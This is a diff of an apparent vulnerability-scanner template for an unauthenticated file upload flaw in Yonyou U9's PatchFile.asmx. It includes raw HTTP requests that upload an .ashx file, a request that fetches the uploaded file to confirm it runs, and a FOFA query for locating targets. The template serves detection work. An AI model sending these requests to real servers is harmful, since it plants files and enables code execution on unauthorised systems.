@@ -1,5 +1,4 @@
 id: yonyou-u9-patchfile-upload
-
 info:
   name: Yonyou U9 PatchFile.asmx - Unauthenticated Arbitrary File Upload
   author: Co5mos,ProjectDiscoveryAI
@@ -8,17 +7,20 @@ info:
     An arbitrary file upload vulnerability in U9 PatchFile.asmx allows attackers to upload files to the server.This can lead to various security issues including remote code execution.
   metadata:
     runzero-review: REJECT/2025-11-25/Creates random file uploads repeatedly
-    verified: true
     fofa-query: title="U9-登录"
-  tags: unauth,file-upload,yonyou,u9,rce
-
+    verified: true
+  tags: file-upload,rce,u9,unauth,vuln,yonyou
 variables:
   filename: '{{rand_base(5)}}.ashx'
-
 flow: http(1) && http(2)
-
 http:
-  - raw:
+  - matchers:
+      - internal: true
+        part: body
+        type: word
+        words:
+          - <SaveFileResult>true</SaveFileResult>
+    raw:
       - |
         POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1
         Host: {{Hostname}}
@@ -35,23 +37,15 @@ http:
           </SaveFile>
           </soap:Body>
         </soap:Envelope>
+  - matchers:
+      - condition: and
+        # digest: 490a0046304402207b76824ccf0b3615bda5fe2803cc3d20ed0d1da0bc0d1d9f7a1edb5a7b8ff056022050eadeb55586f4092e141ed2e2be0e4278525bdf1de2efa44ae52b34991a5e8a:922c64590222798bb761d5b6d8e72950
 
-    matchers:
-      - type: word
-        part: body
-        words:
-          - "<SaveFileResult>true</SaveFileResult>"
-        internal: true
-
-  - raw:
-      - |
-        GET /CS/Office/AutoUpdates/{{filename}} HTTP/1.1
-        Host: {{Hostname}}
-
-    matchers:
-      - type: dsl
         dsl:
           - status_code == 200
           - contains_all(body, "2468642","File deleted successfully")
-        condition: and
-
+        type: dsl
+    raw:
+      - |
+        GET /CS/Office/AutoUpdates/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
